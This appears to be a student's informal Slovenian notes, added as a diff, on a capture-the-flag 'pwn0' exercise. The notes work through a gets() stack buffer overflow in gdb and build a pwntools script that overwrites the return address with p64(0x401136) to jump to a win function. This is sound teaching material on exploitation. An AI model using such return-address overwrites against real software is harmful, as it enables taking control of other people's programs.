@@ -1,0 +1,184 @@
+pwn0.zip !!!!!!!!
+gets -> nevarnost ker loh preveč prepišeš (po stacku loh bedarije pišeš, ko greš čez buffer,
+kritična sta ret_addr(kam se vrnemo ko je konec funkcije), če ga povoziš se lahko vrneš
+kjer nekaj laufa -> ret2win, in base pointer (začetek) in stack pointer (konec).
+
+ko se nekam vrnemo morm stack pointer premaknt na eno prej k tm k je ret addr v stacku (konec prejsnega bufferja).
+base pointer gre pa tam kjer je prešnj ret addr. )
+
+
+gdb komande
+
+gdb main //debugganje maina
+
+znotraj tega zdej:
+r(un) zalaufa cel program
+
+ce zdj naspammas AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA bo to dal v return address 0x41414141
+
+
+RBP -> base pointer, vidimo da je 0x4141414141
+RSP -> stack pointer
+RIP -> instruction pointer (prog števec) kaže na main+38 in reče da ga je zmotil ret
+
+gremo v dissasebly pogledat in vidmo da je hotu returnat na 0x41414141414141
+
+STACK nam kaze kaj imamo nizje po stacku
+
+BACKTRACE pa returne -> vidmo da smo same A-je napisal notr tko da se cel backtrace sesuje
+
+komanda b -> breakpoint
+b * main -> ustavi na zacetku maina
+
+in damo se enkrat run vidimo da smo se ustavl na zacetku maina
+glavne stvari: gets pa puts vidimo -> branje in izpisovanje
+
+komanda ni -> next instruction
+
+ce kliknem enter izvede isti ukaz kot prej -> nerabs skos "ni" piast
+
+pejmo do gets-a
+
+kaj gets dela -> prebere in napise tam kjer je spremenljivka (za nas stack)
+
+vidimo rdi
+
+v rsi vidimo da smo mi v zacetku stacka (glede na RSP)
+
+dejmo zdej AAAAAAAAAAAAAAAAAAAAAAAAAAAA'je notr
+program sezmer laufa ampak backtrace je pa cis sfukan, torej program se ni ugotovil da se je neki zgodil
+
+gremo do puts in vidmo da se naredi vse lepo (izpise cis na vrhu konzole), gremo zdj probat do ret it
+
+in vidmo da ko stisnemo enter ko smo na return se na vrhu izpise segmentation fault
+
+probimo na WIN skoct, sam kako vemo kje je to? (torej koliko A-jev rabimo)
+
+uporabimo skripto pwntools
+
+pip3 install --upgrade pwntools --break-system-packages
+
+touch sol.py
+
+from pwn import *
+
+p = process('./main')
+
+p.interactive() //interaktivno
+
+///
+
+in pol recemo python3 sol.py
+z ctrl-z ubijes
+
+from pwn import *
+
+p = process('./main')
+
+p.sendline(b"kebab") //binary string (v navadnem stringu mas lahko arbitraren reprezentacijo, v binary pa samo kar je loh zapisano z byti (ascii))
+
+p.interactive()
+
+////
+
+b"\x41" -> z \x loh hex zapisujes notr in se converta v character iz hexa
+
+p.sendline(b"A"*40)
+
+ok glede na zgornjo kodo se zdej tuki notr že nalima in nerabmo mi nc notr direkt pisat
+
+kako pa zdej in ta interactive in gdb laufaš ->
+
+namest p = process loh daš gdb.debug('./main', 'b * main')
+zdej mamo se un debugger IN interactive mode
+
+sam nismo na main-u ampak na _start
+uporabimo ukaz c -> za continue in nas bo fuknu na breakpoint
+
+
+in zdej smo na mainu in damo "ni"je
+
+ne bomo pa rabl nc dat notr v gets, ker je notr ze zafilal iz pythona
+
+in puts nam pa vrne v terminal
+
+vidmo da nismo prepisal return addresa, smo pa rbp prepisal, torej bo slej k prej se sesul k bo zacel RBP uporablat (segmentation fault dobimo)
+
+64 A-jev bo pa zadost
+
+rabmo od WIN lokacijo da loh tisto damo v ret addr
+
+analizirjamo -> buffer je 20B, pred njim mamo base pointer, pred njim pa ret addr(kar hocmo povozit).
+base pointer je velik 8B (64 bit / 8 bit na bajt)
+ret pointer je tudi 8B
+                             
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b"A"*20 + b"B"*8 + b"C"*8)
+
+p.interactive()
+
+
+TESTIRAJMO
+
+vidmo da... ni tko ez kok smo mislili....
+
+preden se ret main izvede poglejmo registre... kako vemo da nismo povozil.... v RIP (instruction pointerju ni to kar smo hotl), na base pointerju vidmo da smo jih samo polovico povozil.... kako to? a je se kej druzga umes?
+
+umes je random space zarad offsetov, morjo bit aligned ukazi pa to, 4B nismo zafilal in smo dal notr Cje, ampak mi hocmo Cje v ret addr (ne v base pointer), torej za 12 smo sfalil
+
+zato rabmo 32 A-jev 
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+p.sendline(b"A"*32 + b"B"*8 + b"C"*8)
+
+p.interactive()
+
+zdej na backtrace-u po getsu vidmo da so nasi C-ji lepo notr!!!! (v back trace in disasm vidmo)
+
+kako pa vemo kje je funkcija
+
+ukaz disass
+
+damo disass win
+
+zacetek win:
+0x0000000000401136
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+# 0x0000000000401136 
+p.sendline(b"A"*32 + b"B"*8 + b"\x00\x00\x00\x00\x00\x40\x11\x36")
+
+p.interactive()
+
+////////
+sam zdj v ret vidmo da je lih obratno naredu
+
+little pa big endian ( da loh iz registrov lepo zaporedno pisemo v pomnilnik, zato pa imamo pac te dve varianti in je fizično mogoče bolš kable vezat od konca registra na vrh pomnilika, al pa od zacetka registra na vrh pomnilnika -> od tukaj big and little endian. torej pri tem gre za HARDWARE problem)
+
+zato mormo obrnt, ampak mamo en bolsi ukaz:
+
+from pwn import *
+
+p = gdb.debug('./main', 'b * main')
+
+# 0x0000000000401136 
+p.sendline(b"A"*32 + b"B"*8 + p64(0x401136)) //64bit little endian (kar mi rabmo) naredi
+
+p.interactive()
+
+
+in zdj vidmo ko gremo do return da se bo returnu v win torej return adress je sedaj win
+in z "ni" gremo skozi funkcijo
+
+no in pac se zakomentiras gdb debug vidis da se takoj izvede use in naredi you win in mas sam p = process main nazaj potem to sam skozi gre
+
+
